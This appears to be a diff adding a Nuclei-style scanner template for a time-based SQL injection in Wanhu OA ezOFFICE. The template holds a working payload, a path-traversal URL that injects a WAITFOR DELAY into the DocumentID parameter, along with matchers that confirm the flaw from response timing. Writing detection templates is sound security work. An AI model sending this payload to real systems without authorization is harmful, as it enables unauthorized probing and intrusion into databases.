@@ -1,0 +1,31 @@
+id: poc-yaml-wan-hu-oa-ezoffice-sql
+info:
+  name: 万户OA ezOFFICE SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27--'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "iSignature"
+          - "function DoJFSignature()"
+      - type: dsl
+        dsl:
+          - 'duration > t1'
+      - type: word
+        part: header
+        words:
+          - "text/html"
